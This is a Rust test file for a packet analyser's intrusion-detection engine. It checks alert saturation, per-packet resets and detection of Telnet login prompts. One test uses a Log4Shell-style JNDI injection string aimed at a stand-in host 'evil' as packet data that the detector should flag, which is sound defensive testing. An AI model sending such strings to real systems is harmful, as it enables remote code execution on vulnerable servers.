#[path = "support/packets.rs"]
mod packets;
#[cfg(feature = "terminal-ui")]
#[path = "support/critical.rs"]
mod critical;

#[cfg(feature = "terminal-ui")]
use packrat_tui::app::App;
use packrat_tui::net::security::SecurityEngine;

#[test]
#[cfg(feature = "terminal-ui")]
fn saturated_ids_history_does_not_suppress_new_critical_incidents() {
    let mut app = App::new_for_test();
    for no in 1..=1000 {
        app.configure_core(move |core| core.security.update(&critical::http_framing_ambiguity(no)));
    }
    assert_eq!(app.core.read().unwrap().security.ids_alerts.len(), 1000);
    for no in 1001..=1002 {
        app.inject_packet(critical::http_framing_ambiguity(no));
    }
    assert_eq!(app.core.read().unwrap().security.ids_alerts.len(), 1000);
    assert!(app.alert_overlay_open);
    let core = app.core.read().unwrap();
    let mut delivered: Vec<_> = core
        .alert_center
        .items
        .iter()
        .filter(|item| item.source == "IDS" && item.title == "HTTP request smuggling ambiguity")
        .map(|item| (item.first_packet, item.last_packet, item.hit_count))
        .collect();
    delivered.sort_unstable();
    assert_eq!(delivered, [(1001, 1001, 1), (1002, 1002, 1)]);
    assert_eq!(core.incidents.active().unwrap().last_packet, 1002);
}

#[test]
fn batches_are_packet_local_and_reset_without_replaying_old_findings() {
    let mut engine = SecurityEngine::new();
    assert!(
        !engine
            .inspect(&packets::tcp(1, 1, 0x18, b"${jndi:ldap://evil/x}"))
            .ids
            .is_empty()
    );
    assert!(
        engine
            .inspect(&packets::tcp(2, 25, 0x18, b"benign"))
            .ids
            .is_empty()
    );
    engine.clear();
    assert!(
        engine
            .inspect(&packets::tcp(3, 1, 0x18, b"benign"))
            .ids
            .is_empty()
    );
}

#[test]
fn saturated_exposure_history_still_emits_the_current_packet() {
    let mut engine = SecurityEngine::new();
    let prompt = |no| {
        let mut packet = packets::tcp(no, 1, 0x18, b"login: ");
        packet.bytes[34..36].copy_from_slice(&23_u16.to_be_bytes());
        packrat_tui::net::parser::parse_ethernet(&packet.bytes, no, no as f64)
    };
    for no in 1..=1000 {
        engine.update(&prompt(no));
    }
    assert_eq!(engine.vuln_hits.len(), 1000);
    let findings = engine.inspect(&prompt(1001));
    assert_eq!(findings.vulnerabilities.len(), 1);
    assert_eq!(findings.vulnerabilities[0].kind, "Telnet authentication prompt");
    assert_eq!(findings.vulnerabilities[0].pkt_no, 1001);
    assert_eq!(engine.vuln_hits.len(), 1000);
}
